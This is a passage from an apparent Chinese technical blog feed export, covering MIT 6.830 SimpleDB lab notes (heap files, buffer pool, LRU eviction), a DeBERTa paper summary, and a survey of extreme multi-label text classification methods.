<p>这里需要支持 <code>HeapFile</code> 的修改表操作，即增删元组，需要从 <code>HeapPage, HeapFile, BufferPool</code> 三层由底向上地支持增删功能。之前说过，<code>HeapFile</code> 由很多个 <code>HeapPage</code> 组成，通过 <code>BufferPool</code> 统一读取页面进行缓存。在增删元组的时候，<code>HeapFile</code> 需要找到最后一个有空 slot 的页面，插入元组并更新其 RecordId，还需要将页面标记为 “脏” 的，因为页面发生了改变，丢弃前必须写回磁盘。删除元组时，<code>HeapFile</code> 根据其 RecordId 直接定位页面，将对应 slot 标记为空，将页面标记为脏即可。而 <code>HeapPage</code> 则负责在当前页面完成增删。<code>BufferPool</code> 的插入和删除元组操作，则要先通过 <code>Catalog</code> 定位到 <code>HeapFile</code>，在获得修改后脏页面后需要更新缓存中的页面，如果之前没有标记脏位，这里也需要标记。</p>
<p>上面是简单的逻辑介绍，在实现的时候还有些细节可以处理。在插入页面时，找到有空 slot 的页面后，需要具体找到 slot 的位置。由于 bitmap 是以 <code>byte[]</code> 存储的，可以先找到不为 - 1 的 byte，再在 byte 内找到标识位不为 1 的索引。-1 代表着一个全为 1 的有符号数，对于任意长度的有符号数均是如此。因为在负数的补码实现下，最高位的权重是负的，其余位的权重是正的，<span class="math inline">\(-2^n+\sum_{i=0}^{n-1}2^i=-1\)</span>。在插入页面时，若不存在有空 slot 的页面，需要新建页面，完成插入后最好将页面写回文件，不然 <code>numPages()</code> 方法的返回结果会错误。</p>
<h3 id="insert-delete">Insert &amp; delete</h3>
<p>在实现了 <code>HeapFile</code> 的插入删除操作后，这两个操作符也不难了。值得注意的是，这两个操作只需要返回一个整数元组，代表受影响的元组数量。因此 <code>fetchNext</code> 方法只应该返回一个 tuple，之后就返回 null。</p>
<h3 id="page-eviction">Page eviction</h3>
<p>最后，需要完成 <code>BufferPool</code> 的页面调度算法，也就是页面逐出的逻辑。操作系统上的页面调度算法有很多，先进先出，时钟算法，LRU（最近未使用）等。最常用的算法就是 LRU，因为它的性能是最好的。LRU 主要包含两个操作，获取页面和逐出页面。在获取页面时，先判断页面是否在缓存区中，命中则直接返回，未命中则加载至缓存区中。逐出页面时，删除最近最少使用的页面。为了达到<span class="math inline"> \(O(1)\)</span> 的获取页面和逐出页面的复杂度，需要使用一个 HashMap 和一个链表，HashMap 存储链表中的指针，用于查询是否在缓存区中。链表按最近使用的顺序存储页面，在页面使用后或者需要删除时完成高效地移动和删除。具体可以参考 <a href="https://leetcode.cn/problems/lru-cache/">146. LRU 缓存 - 力扣（LeetCode）</a>。</p>
<p>除了页面逐出操作外，还需要实现 <code>flushPage</code> 方法将脏页面写回磁盘，但不逐出，以及 <code>discardPage</code> 将页面丢弃，不将页面写回磁盘。通过调用 <code>HeapFile.writePage</code> 以及直接操作 <code>BufferPool</code> 即可实现这两种操作。</p>
]]></content>
      <categories>
        <category>后端</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MIT 6.830</tag>
        <tag>代码</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT 6.830 数据库实验 Lab 1 实验报告</title>
    <url>/blog/2022/11/16/MIT-6-830-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>最近开始学数据库了，找到了 MIT 6.830 的 Lab，感觉质量还挺高的。打算从实现上了解下数据库的细节。MIT 6.830 的实验要求使用 JAVA 语言实现一个简易的关系数据库，支持常用的增删改查操作、事务、B + 树索引、恢复等功能。这次我分享下 Lab 1 的一些总结。我把课程资料也附在了后面，有兴趣一起学习的一起来学习讨论～<span id="more"></span></p>
<h2 id="整体架构">整体架构</h2>
<p>代码主要分为以下几个目录：</p>
<ul>
<li>common: 定义公用的类：Database、Catalog，其中 Database 提供了静态方法访问 Bufferpool、Catalog 的单例</li>
<li> execution: 定义了数据库操作符的 <code>OpItertor</code> 接口，支持 scan、filter、aggregate、join 等操作</li>
<li> index: B + 树索引</li>
<li> optimizer: 查询优化</li>
<li> storage: 数据库的存储，定义了 Tuple、Record、Field 等基础概念类，以及 Heap File 存储</li>
<li> transaction: 事务</li>
</ul>
<p>后面的 6 个 lab 会逐渐地实现这些功能，在第一个 lab，只需要实现一些存储逻辑。</p>
<h2 id="exercises">Exercises</h2>
<h3 id="field-tuple">Field &amp; Tuple</h3>
<p>这部分要求实现基础的 Field、Tuple 类的功能，具体包含 <code>TupleDesc</code> 和 <code>Tuple</code> 两个类。</p>
<p>先介绍一下 <code>Field</code>，SimpleDB 支持两种数据类型：整数与定长字符串，两种类型定义在枚举类 <code>Type</code> 中，对应的 <code>IntField</code> 和 <code>StringField</code> 实现了 <code>Field</code> 接口，可以同种 Field 相互比较。仅有定长类型简化了数据库模型。</p>
<p><code>TupleDesc</code> 是每个数据库表的元组描述，包含若干个字段，简单来说，就是一个 (Type, Name) 的数组，记录了每个字段的类型和可为字段的域名。这个类中主要要实现构造函数和一些 <code>get</code> 方法，比较简单。值得注意的是这里要实现一个静态的 <code>Merge</code> 方法，用于将两个 <code>TupleDesc</code> 对象合并，在后面的 <code>join</code> 操作时会用到。</p>
<p><code>Tuple</code> 是一条元组，由一个 <code>TupleDesc</code> 构造而成，包含了一个 <code>Field</code> 的数组存储各个字段的值。其中，每个 <code>Tuple</code> 关联一个 <code>RecordId</code>，为该元组在表的索引 id，由页号 + 页内偏移完成，这里只需要实现 get、set 方法，recordId 后面会用到。</p>
<h3 id="catalog">Catalog</h3>
<p><code>Catalog</code> 用于追踪数据库中的所有表，提供了方法用于新建和删除表。正常来说，<code>Catalog</code> 应该从磁盘加载，但是在这个 lab 不需要考虑序列化和加载的逻辑，只需要实现启动后的数据库表的管理逻辑。每个数据库表包含以下几个信息：</p>
<ul>
<li>表名：一个字符串</li>
<li>文件：一个实现了 <code>DbFile</code> 的文件对象</li>
<li>表的 id：由文件对象唯一对应，一般是绝对路径的 <code>hashcode</code></li>
<li>主键：一个字符串，SimpleDB 只考虑单一主键</li>
<li>元组描述，一个 <code>TupleDesc</code> 对象</li>
</ul>
<p><code>Catalog</code> 类还提供了一个已经实现的 <code>loadSchema</code> 方法，用于从文件中读取数据库的模式并新建表。</p>
<h3 id="bufferpool">BufferPool</h3>
<p><code>BufferPool</code> 类定义了一个统一的、具有缓存的页面读取方法。一般来说，操作一个页面需要先将其从磁盘加载到内存中，然后才能操作。<code>BufferPool</code> 定义了一个缓存区，当页面已经被加载到内存后，就无需再次加载了。这里后续需要实现一个类似 LRU 的页面调度算法，在本次 lab 中尚不需要。</p>
<p>本 lab 中，BufferPool 需要实现一个 get 页面的方法，当缓存区满时，只需要抛出 <code>DbException</code> 异常即可。这里需要根据 <code>PageId</code> 获取 table id，进而通过 Catalog 获取表进而读取。</p>
<h3 id="heappage">HeapPage</h3>
<p>这个 Exercise 要实现 HeapFile 的读取方法，包含 <code>HeapPage, HeapPageId, RecordId</code> 三个类。其中，<code>RecordId</code> 类的功能已经在上面介绍，是每个元组在表中的唯一的记录 id，包含 <code>PageId</code> 和在页内的编号。<code>HeapPageId</code> 实现了 <code>PageId</code> 接口，包含一个表 id 以及页面号，与 <code>RecordId</code> 类似。这两个类都比较简单，只需要实现一些 get、equals, hashcode 方法即可。</p>
<p><code>HeapPage</code> 是 <code>HeapFile</code> 的页面类，实现了 <code>Page</code> 接口，需要支持获取页面数据、脏位标记等功能。这里先简单介绍下 <code>HeapFile</code>，这是一种无序的存储格式，记录以乱序的方式存储在页面中。每个页面由若干个插槽（slot）组成，每个 slot 可用于存储一条记录，页面首部包含一个 bitmap 记录每个 slot 是否包含记录。在插入记录的时候，找到一个空的插槽插入即可。</p>
<p>对于定长记录的表，这里就已经很圆满了。而对于非定长的表，页面内的 slot 数量是可变的，slot 的大小也是可变的。这时，需要在页面尾部记录插槽的位置、大小、数量，还要保存已经有的记录的位置和大小。放在尾部，是因为这样可以方便地增长 slot 数量，当尾部和正向的记录重合时，就意味着页面满了。这种页面还需要周期性地重排一下，避免过多的碎片。当然，这些是题外话，SimpleDB 中不需要考虑这种复杂情况。</p>
<p>本次 lab 中，<code>HeapPage</code> 类需要实现查询槽位状态、计算空槽数量等功能，还要实现一个元组的迭代器。在按上面捋顺了 HeapFile 的原理之后，就很简单了。</p>
<h3 id="heapfile">HeapFile</h3>
<p>这个类主要实现两个功能：</p>
<ul>
<li>读取指定页面。值得注意的是，数据库文件可能很大，因此不能直接把整个文件加载到内存中，需要使用支持随机读写的 <code>RandomAccessFile</code>，移动指针到指定页面的位置，再进行读取。</li>
<li>返回一个可以迭代访问数据库所有元组的 <code>DbFileIterator</code>。值得注意的是，这个 <code>DbFileIterator</code> 需要支持重用，因此其不是一个传统的 <code>Iterator</code>，需要额外的代码来实现一个 <code>DbFileIterator</code>。我建议新建一个类继承自 <code>AbstractDbFileIterator</code>，其对接口的逻辑进行了一定简化。更好的方式是实现一个通用的适配器，把传统的 <code>Iterator</code> 转换成需要的格式。</li>
</ul>
<h3 id="seqscan">SeqScan</h3>
<p>最后一个 Exercise，实现表的遍历操作。这里包装一下上面的 <code>HeapFile</code> 的 <code>Iterator</code> 逻辑，实现 <code>OpIterator</code> 接口即可。这个新的 <code>OpIterator</code> 也需要支持重用，后面也会比较麻烦。这里还不需要担心，写完，通过单元测试就收工啦！</p>
<h2 id="总结">总结</h2>
<p>这个 lab 主要是先熟悉了数据库的整体架构以及相互间的关联。之后，在底层实现 <code>HeapFile</code> 这一经典的文件存储方法，对于页面的读取和元组的存储有了更深的理解。最后，实现了一个数据库的遍历操作，简单了解数据库操作符的规范和接口，剩下的操作符需要在后面实现。</p>
<h2 id="相关链接">相关链接</h2>
<p>我学习的是 2021 年春季的版本，相关链接如下：</p>
<ul>
<li>课程官网: http://db.lcs.mit.edu/6.5830/2021/assign.php, 里面有讲义、PPT，没有视频</li>
<li>代码：https://github.com/MIT-DB-Class/simple-db-hw-2021</li>
</ul>
<h2 id="section"></h2>
]]></content>
      <categories>
        <category>后端</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MIT 6.830</tag>
        <tag>代码</tag>
      </tags>
  </entry>
  <entry>
    <title>DeBERTa: 注意力解纠缠和解码加强版的 BERT</title>
    <url>/blog/2022/09/04/DEBERTA/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>DeBERTa 是微软于去年在《DEBERTA: DECODING-ENHANCED BERT WITH DIS-ENTANGLED ATTENTION》中提出的预训练模型， 论文收录于 ICLR 2021 中。DeBERTa (<strong>De</strong>coding-enhanced <strong>BERT</strong> with disentangled <strong>a</strong>ttention)， 顾名思义，相较于普通的 BERT，DeBERTa 加强了其解码能力，解耦了注意力。DeBERTa 第一次在 SuperGLEU 基准上超越了人类， 在 MNLI、SQuAD、RACE 数据集上相较于 RoBERTa 也有较大的提升（0.9%-3.6%）。</p>
<span id="more"></span>
<p>DeBERTa 的模型和代码开源在 <a href="https://github.com/microsoft/DeBERTa1">github</a>。 现在 SuperGLEU 上的第一已经是 ST-MoE-32B 了，不过排在 DeBERTa 之前的模型参数量似乎都是 DeBERTa 的数倍， 这说明 DeBERTa 还是很有读一下的必要的。</p>
<h2 id="介绍">介绍</h2>
<p>DeBERTa 对于 BERT 共两个改进点，注意力解耦与增强掩码解码。具体体现在：</p>
<p><strong>注意力解纠缠。</strong>BERT 中，不同类型的 embedding 求和作为最终的表征（例如 token embedding、position embedding）。 DeBERTa 对每个单词使用两个向量进行表示，分别对内容、位置进行编码。单词间的注意力权重由解纠缠矩阵分别根据其内容和相对位置计算。</p>
<p><strong>增强的掩码解码器。</strong>DeBETa 也是使用掩码语言模型进行预训练，与 BERT 类似。在这个任务设定下，被掩码词的绝对位置有时是很重要的。 例如 “a new <strong>store</strong> opened beside the new <strong>mall</strong>."这句话，如果对"store"和"wall" 进行掩码，两者的上下文、语义都接近，但是句法作用是不同的（例如谁是主语）。 这些细微差距很大程度上与绝对位置相关，因此 DeBERTa 在 softmax 层前合并了绝对位置嵌入。 在该层中，模型基于聚合上下文和绝对位置预测被掩码的单词。</p>
<p>另外，论文还提出了一种新的虚拟对抗训练方法，用于微调 plm 到下游的 NLP 任务。该方法有效地提高了模型的泛化能力。</p>
<h2 id="架构">架构</h2>
<h3 id="解耦注意力">解耦注意力</h3>
<p>对于位置<span class="math inline"> \(i\)</span> 的 token，论文使用两个向量<span class="math inline"> \(\{H_i\},\{P_{i|j}\}\)</span> 分别代表它的内容嵌入和与位置<span class="math inline"> \(j\)</span>token 的相对距离。位置<span class="math inline"> \(i\)</span> 与位置<span class="math inline"> \(j\)</span> 的 token 间的注意力分数可以分解为下面四个部分： <span class="math display">\[
\begin{aligned}
A_{i,j}&amp;=\{H_i,P_{i|j}\}\times\{H_j,P_{j|i}\}^T\\
&amp;=H_iH_i^T+H_iP_{j|i}^T+P_{i|j}H_j^T+P_{i|j}P_{j|i}^T
\end{aligned}
\]</span> 也就是说，一对 token 间的注意力权重可以用内容到内容、内容到位置、位置到内容、位置到位置四个注意力的解纠缠矩阵进行计算。</p>
<p>传统的相对位置嵌入方法只使用一个单独的嵌入矩阵，计算相对位置偏差，再用于计算注意力分数。这相当于只使用了上述公式中的 “位置到位置” 注意力。论文认为位置到内容也很重要，建模了位置和内容间的交叉关系。此外，由于 DeBERTa 本身使用的就是相对位置嵌入，所以直接将上述公式中的位置到位置注意力部分删除了。</p>
<p>接下来就是使用两套 Query、Key 矩阵，分别将内容、位置嵌入映射到 query、key，然后求解注意力分数了。</p>
<h3 id="掩码解码增强">掩码解码增强</h3>
<p>为了将绝对位置信息融入到 MLM 预测中，DeBERTa 在在解码掩码字时只使用绝对位置作为补充信息，在 Transformer 层中使用相对位置信息。因此，论文称 DeBERTa 的解码组件为增强掩码解码器（Enhanced Mask Decoder，EMD），其结构如下所示，由 n 个共享权重的块堆叠而成。<span class="math inline">\(H\)</span> 代表前一层 Transformer 输出的隐藏状态，<span class="math inline">\(I\)</span> 代表解码所须的信息，例如绝对位置嵌入或前一层 EMD 的输出。第一层 EMD 的<span class="math inline"> \(I\)</span> 是绝对位置嵌入信息，后续层的<span class="math inline"> \(I\)</span> 是前一层 EMD 的输出。</p>
<p><img src="decoder-layer.png"></p>
<p>在实证研究中，论文比较了这两种使用绝对位置的方法，发现 EMD 的效果要好得多。论文推测，BERT 使用的较早的合并绝对位置可能会妨碍模型学习足够的相对位置信息。而且 EMD 的共享参数也没有过多增加模型参数量。</p>
<h2 id="微调">微调</h2>
<p>DeBERTa 使用了一种虚拟对抗训练算法，Scale-invariant-Fine-Tuning (SiFT)，是 Miyato 等人 (2018) 中描述的算法的变体。</p>
<p>虚拟对抗训练是一种提高模型泛化能力的正则化方法。通过改进模型对对抗样本的鲁棒性实现。对抗样本是通过对输入进行小的扰动来创建的。在 NLP 中，是在单词嵌入进行扰动，而非原始单词序列。然而，嵌入向量的取值范围在不同的词和模型中是不同的。对于具有数十亿个参数的大型模型，方差会变得更大，导致对抗训练的一些不稳定性。</p>
<p>论文受层标准化启发，提出了 SiFT 算法，通过对归一化的词嵌入应用扰动来提高训练的稳定性。具体来说，将 DeBERTa 微调到下游的 NLP 任务时，SiFT 首先将词嵌入向量归一化为随机向量，然后对归一化后的嵌入向量进行扰动。实验发现，规范化大大提高了微调模型的性能。这种改进在较大的 DeBERTa 模型中更为突出。</p>
<h2 id="实验">实验</h2>
<p>论文在数个 NLU 基准上测试了 DeBERTa。</p>
<h3 id="大模型">大模型</h3>
<p>与 BERT 相同的设定预训练 DeBERTa，区别在于使用的是 BPE 子词模型。预训练使用了 96 个 V100，20 天。下面是 GLEU 榜单的结果。</p>
<p><img src="GLEU.png"></p>
<p>下面是 MNLI、SQuAD 等基准上的结果。</p>
<p><img src="SQuADs.png"></p>
<p>可以看出 DeBERTa 已经超过了自回归的 XLNET，可见其性能。</p>
<h3 id="小模型">小模型</h3>
<p>base 模型的设置与 BERT-base 一致，12 层的架构。结果如下，可以看出相较于 XLNET 和 RoBERTa 是有明显改进的。</p>
<p><img src="base.png"></p>
<h3 id="消融实验">消融实验</h3>
<p>为了验证结果，论文首先重新训练了一个 RoBERTa-base，作为基准。</p>
<p>消融实验主要测试了三种变体：</p>
<ul>
<li>-EMD：没有增强掩码解码器，也就是跟 BERT 一样直接 softmax</li>
<li>-C2P：没有内容 - 位置间的注意力</li>
<li> -P2C：没有位置 - 内容间的注意力。由于 XLNET 也使用了相对位置偏差，这种设置接近接近于 XLNET+EMD</li>
</ul>
<p><img src="ablation.png"></p>
<p>从表格可以看出，删除 DeBERTa 中的任何一个组件都会导致性能的大幅下降，尤其是在 SQuAD 数据集上。</p>
<h3 id="亿">15 亿</h3>
<p>为了测试 DeBERTa 的上限，论文还构建了一个 48 层，共计 15 亿参数的 DeBERTa，首次以单个模型在 SuperGLUE 上超过了人类，集成性能也取得了第一名，具体分数如下。</p>
<p><img src="1.5B.png"></p>
<h2 id="总结">总结</h2>
<p>这篇论文其实回答了一个蛮重要的问题，相信 NLP 新人刚了解 BERT 的时候，或多或少都会对 embedding 直接相加有一些疑问。解纠缠和绝对位置的融合，同时兼顾了绝对位置的句法信息，和相对位置的邻接关系。解纠缠也使得各个 embedding 更为灵活结合。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://aestheticisma.github.io/2021/11/24/deberta/">DeBERTa 论文解读 - Fan's Blog (aestheticisma.github.io)</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>DEBERTA</tag>
      </tags>
  </entry>
  <entry>
    <title>XMTC: 极端多标签文本分类相关工作</title>
    <url>/blog/2022/08/27/XMTC/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本博客主要总结一下近期看到的一些关于极端多标签文本分类（Extreme Multi-Label Text Classification，XMTC）的相关工作。 之前尝试研究了一个月，发现 SOTA 复现不太出来，只能放弃了换方向了。希望这篇博客能帮到有缘人。</p>
<span id="more"></span>
<h2 id="简介">简介</h2>
<p>极端多标签文本分类（Extreme Multi-Label Text Classification，XMTC）。给定一段文本，和极多（百、千、万乃至更多）的标签，判断文本所属的标签子集。例如，维基百科有百万级别的标签，每个百科文本都对应若干个标签。亚马逊的商品，有着复杂的垂直标签结构，标签数量也是百万级的。</p>
<h3 id="挑战">挑战</h3>
<p>XMTC 主要面临以下挑战：</p>
<ul>
<li>稀疏性：大量标签都只有少数样本与之关联，典型的长尾分布</li>
<li>计算成本高：标签数量过多，为每个标签独立训练分类器成本过高</li>
<li>可扩展性：对新增标签的可扩展性</li>
</ul>
<figure>
<img src="Untitled.png" alt="两个XMTC数据集上，只有一半或更少的标签关联至少5个实例"><figcaption aria-hidden="true">两个 XMTC 数据集上，只有一半或更少的标签关联至少 5 个实例</figcaption>
</figure>
<p>两个 XMTC 数据集上，只有一半或更少的标签关联至少 5 个实例</p>
<h3 id="解决方法">解决方法</h3>
<p>XMTC 的方法可以分为以下四类：</p>
<p>一对多分类：为每个标签构建 OVR（one vs rest）分类器，可以实现较高精度。但当标签数量过多时，训练、预测开销过大。</p>
<p><strong>目标嵌入的方法</strong>：标签矩阵<span class="math inline"> \(N\times L\)</span> 中，N，L 分别为样本、标签数量。这个矩阵庞大稀疏，难以直接学习到一个可靠的映射。如果可以使用线性映射或者其他方法，完成降维<span class="math inline"> \(L \rightarrow \hat L\)</span> ，就可以学习到特征 - 降维后的标签间的可靠映射。然后再通过升维<span class="math inline"> \(\hat L \rightarrow L\)</span> ，得到真实标签。此类方法的差异主要在降维、升维技术上，例如压缩感知、奇异值分解等。</p>
<p><strong>集成树的方法</strong>：类似决策树，区别在于使用特征的加权和而非单一特征的信息增益进行划分，健壮性更好。</p>
<p><strong>深度学习方法</strong>：使用深度学习特征，而非传统的词袋、tf-idf 特征。</p>
<h3 id="数据集">数据集</h3>
<p>其中的 L 是标签数量，可以看到大型数据集上，有几十万标签，规模是很大的。</p>
<p><img src="Untitled-1.png"></p>
<h3 id="评估指标">评估指标</h3>
<p>对于文档，根据分数输出一个有序的标签列表。然后使用排序指标评估：</p>
<ul>
<li>Precision@TopK: TopK 的查准率，越高越好</li>
<li> NDCG@TopK: 归一化折损累计增益，越高越好</li>
</ul>
<h2 id="xml-cnn">XML-CNN</h2>
<p>2017，Deep Learning for Extreme Multi-label Text Classification</p>
<p>首次使用深度学习方法解决 XMTC 问题，使用 CNN + 交叉熵 loss。为了避免池化层后直接接分类线性层的参数过多，中间引入了一个较小的线性层，大小为<span class="math inline"> \(h\)</span>。</p>
<figure>
<img src="Untitled-2.png" alt="模型结构图，红色的方框为较小的线性层"><figcaption aria-hidden="true">模型结构图，红色的方框为较小的线性层</figcaption>
</figure>
<p>模型结构图，红色的方框为较小的线性层</p>
<p>结果：在六个数据集上基本达到了 SOTA，消融实验证明 BCE 损失、动态池化、小线性层都是有效的。</p>
<h2 id="attention-xml">Attention-XML</h2>
<p>2019 AttentionXML: Label Tree-based Attention-Aware Deep Model for High-Performance Extreme Multi-Label Text Classification</p>
<p>做法：</p>
<p>构建宽而矮的概率标签树（plt），减少错误积累</p>
<ul>
<li>首先构造初始标签树，对标签的词袋特征，自顶向下 2-means 做层次聚类，直到类别数 &lt; M</li>
<li> 对树进行压缩，得到宽而矮的概率标签树</li>
</ul>
<p>为每一层训练一个 Bi-LSTM 多分类器</p>
<ul>
<li>对每个样本，每层只使用上层该样本的 Top-C 候选的孩子节点训练，类似负采样</li>
<li>每个标签对输入序列计算 attention 得到<span class="math inline"> \(\hat m_i\)</span>，通过共享的全连接、输出层映射到分数</li>
<li>预测的时候，使用链式法则，得到每个标签的概率分数</li>
<li>使用 BCE loss 训练，使用三棵 plt 集成取得最好性能</li>
</ul>
<p><img src="Untitled-3.png"></p>
<p>结果：未集成的 AttentionXML 已经超过了 XML-CNN 达到了 SOTA，集成后性能提升半个点或更多</p>
<h2 id="x-bert">X-BERT</h2>
<p>2019 X-BERT: eXtreme Multi-label Text Classification using Bidirectional Encoder Representations from Transformers</p>
<p>首次将 BERT 扩展到 XMTC 任务，解决以下挑战：</p>
<ul>
<li>直接分类忽视了标签间的依赖关系、相关性</li>
<li> SoftMax 瓶颈</li>
</ul>
<p>论文提出了一个三阶段模型：</p>
<ol type="1">
<li>ELMo 编码标签描述 + tf-idf 特征，KMeans 聚类标签得到 K 个簇</li>
<li> BERT 完成 K 个簇上的多分类</li>
<li>使用一对多分类器完成簇内标签的判断</li>
</ol>
<p>在四个数据集上达到了 SOTA，未与 AttentionXML 比较</p>
<h2 id="x-transformers">X-Transformers</h2>
<p>2020，Taming Pretrained Transformers for Extreme Multi-label Text Classification</p>
<ul>
<li>XLNET 编码标签描述 + 正样本聚合特征（Positive Instance Feature Aggregation, PIFA），进行分层聚类</li>
</ul>
<p><img src="Untitled-4.png"></p>
<ul>
<li> BERT/RoBERTa/XLNET Large + 平方 Hinge-loss 微调聚类标签的多分类（三模型集成效果最好）</li>
<li>使用 tf-idf + 嵌入特征，构建线性 OVA 分类器，使用混合采样策略构建负样本
<ol type="1">
<li>使用聚类簇内其他标签对应的样本作为负样本</li>
<li>使用其他 Topb 聚类簇内标签样本作为负样本</li>
</ol></li>
</ul>
<p>跟 X-BERT 一批人做的，效果超过了 X-BERT，AttentionXML</p>
<h2 id="lightxml">LightXML</h2>
<p>2021 LightXML: Transformer with Dynamic Negative Sampling for High-Performance Extreme Multi-label Text Classification</p>
<p>动机，解决 X-Transformers，Attention-XML 的以下问题：</p>
<ul>
<li>使用多个模型集成，计算资源和成本过高</li>
<li>负样本采样，降低了模型效率和准确性</li>
</ul>
<p>做法：</p>
<ul>
<li>标签聚类：使用标签的稀疏特征，构造概率标签树，与 Attention-XML 类似，但<strong>只有两层</strong>，也就是只有一层聚类结果</li>
<li>文本表示，使用 BERT/RoBERTa/XLNET base，取最后 5 层的 [CLS] 表征拼接</li>
<li>标签召回：根据文本表征完成聚类簇多分类上分数计算，采样所有正样本，由易到难地采样部分负样本</li>
<li>计算分数：根据正负样本标签嵌入、文本表征，计算分数，BCE loss</li>
</ul>
<p>训练资源：</p>
<ul>
<li>1 块 16G V100</li>
</ul>
<p><img src="Untitled-5.png"></p>
<p>数据集统计信息</p>
<p><img src="Untitled-1.png"></p>
<p>使用 3 个模型或者 3 个聚类结果进行集成</p>
<p>结果：在五个数据集上超过了 X-Transformers，达到了 SOTA。消融实验证明 5 个 cls 拼接有助于收敛，动态负采样能够提升性能</p>
<h2 id="gudn">GUDN</h2>
<p>2022，GUDN: A novel guide network for extreme multi-label text classification</p>
<p>动机：LightXML 未使用标签语义信息</p>
<p>做法：</p>
<ul>
<li>特征提取：BERT 编码特征文本，取最后 10 层的 CLS 拼接作为标签提取的特征</li>
<li>引导网络：事实上就是辅助 loss。使用以下两种：文档表征和标签表征间的 MSE loss；标签表征用于分类的 BCE loss</li>
<li> 分类排名：对中等数据集直接使用线性层分类；对大标签数据集使用 BOW 聚类 + 动态负采样，类似 LightXML</li>
</ul>
<p><img src="Untitled-6.png"></p>
<p>实验资源：</p>
<ul>
<li>4 块 24G 3090</li>
</ul>
<p>结果：</p>
<p>在四个数据集上基本达到了 SOTA，超过 LightXML。消融实验证明，论文提出的两个辅助 loss 是有效的。</p>
<h2 id="glo-calxml">GLO-CALXML</h2>
<p>2022，Exploiting Local and Global Features in Transformer-based Extreme Multi-label Text Classification</p>
<p>这篇论文是目前的 SOTA，把 Eurlex-4k 数据集上的 precision 提高了 3 个点多，可惜我没有复现出来。</p>
<p>动机：传统方法只使用 CLS 作为文档表征，只有全局表征，可能缺失信息。</p>
<p>做法：</p>
<ul>
<li>每个标签有 global embedding 和 local embedding</li>
<li>global embedding 和 cls 计算全局概率，local embedding 作为 query 与第一层所有 token embedding 做 attention，取加权和计算局部特征的概率</li>
<li> loss：两个概率的 BCE loss 之和</li>
<li>预测：使用两个概率平均值</li>
</ul>
<p>我猜测这篇论文是从 Eurlex-4k 数据集得到的启发，该数据集由关键词组构成，并不是通顺的句子。所以编码器更高层的表征意义不大，并不存在复杂的上下文。浅层表征反而可以保留更多信息。基于此，设计一个 attention 去直接接触浅层表征是很自然的想法。而且这种 global 和 local 结合的工作印象里也挺多的，多文本分类 MLC 上好像就有。</p>
<p>实验：</p>
<ul>
<li>没有使用标签树，只在标签较少的三个数据集上进行了实验</li>
<li>使用 3 个预训练模型集成</li>
<li>在两个数据集上超过了 LightXML（只使用单模型的情况也是超过的）， 与 GUDN 互有胜负</li>
<li>消融实验证明，局部特征和全局特征的融合是有效的</li>
</ul>
<p>以下是三模型集成结果，可以看出在 Eurlex-4k 和 Wiki10-31K 上分别有 3 个点、2 个点的提升，有点降维打击了。</p>
<p><img src="GLOCALXML-exper.png"></p>
<h2 id="depl">DEPL</h2>
<p>2022，Long-tailed Extreme Multi-label Text Classification with Generated Pseudo Label Descriptions</p>
<p>动机：传统模型都使用 precision@topk 指标，该指标不能很好反应尾部标签的分类性能，论文提出使用 macro-averaged F1@k，使得不同标签有相同的权重。</p>
<figure>
<img src="Untitled-7.png" alt="横坐标，数量由少到多的标签id，纵坐标，Macro-F1@19"><figcaption aria-hidden="true">横坐标，数量由少到多的标签 id，纵坐标，Macro-F1@19</figcaption>
</figure>
<p>横坐标，数量由少到多的标签 id，纵坐标，Macro-F1@19</p>
<p>做法：</p>
<p>将 XMTC 定义为检索任务，根据文档检索标签。为了解决标签文本过短的问题，使用 SVM 构建分类器，并根据 token 重要性生成标签伪描述。具体来说：</p>
<ul>
<li>基于文档的 tf-id 特征 + 点积相似度函数 + hinge loss 训练稀疏分类器，训练维度为词表大小的 label embedding，将其中元素认为是 token 对 label 的重要性，选 topk 的 token 拼接到标签名后</li>
<li>使用 BERT 编码，文档表征选择 cls，标签表征选择最后一层的池化结果，使用点积衡量相似性</li>
<li>负采样，根据第一步分类器的 top 负样本和随机填充的负样本构建标签子集</li>
<li>融合：文档表征后接线性层，得到概率分布 A；点积相似性结果得到另一个概率分布；两者平均作为最终结果</li>
</ul>
<p>框架如下：</p>
<p><img src="Untitled-8.png"></p>
<p>评价指标：除了 P@k，Macro F1@K，还有 PSP@K，PSP@K 是加权版的 P<span class="citation" data-cites="K">@K</span>，预测正确尾部标签的收益更高</p>
<p>结果：在 Macro F1@k，PSP@K 上达到了 SOTA，P@K 要弱一些；消融实验证明，伪标签描述对于尾部标签预测是有效的</p>
<h2 id="treaderxml">TReaderXML</h2>
<p>2022 Exploiting Dynamic and Fine-grained Semantic Scope for Extreme Multi-label Text Classification</p>
<p>一篇比较奇怪的论文</p>
<p>动机：传统方法使用聚类获得标签簇，但是这些簇只有粗粒度的语义，难以建模具体语义</p>
<p>做法：构建细粒度的教师知识优化样本语义</p>
<p>基于层次结构假设，如果一个样本与标签 A 相关，与标签 A 的父标签也相关</p>
<ul>
<li><p>对于每个文档样本 x，遍历其他样本，找到与其余弦相似度 topk 的样本</p></li>
<li><p>将该样本对应的标签、父标签（标签树）编码平均后，得到教师知识</p></li>
<li><p>使用一个掩码多层自注意力（自左向右）、一个多头注意力层完成编码过程</p>
<p><img src="Untitled-9.png"></p></li>
</ul>
<p>损失函数：基于最大熵的多标签一对多损失</p>
<p><img src="Untitled-10.png"></p>
<p>实验结果：在两个数据集上超过 LightXML 达到了 SOTA</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://analyticsindiamag.com/what-is-extreme-multilabel-text-classification/">什么是极端多标签文本分类？ (analyticsindiamag.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/342922980">算法理论 01 SVD 奇异值分解 - 知乎 (zhihu.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>自然语言理解</category>
        <category>文本分类</category>
        <category>多标签分类</category>
      </categories>
      <tags>
        <tag>XMTC</tag>
        <tag>文本分类</tag>
        <tag>多标签</tag>
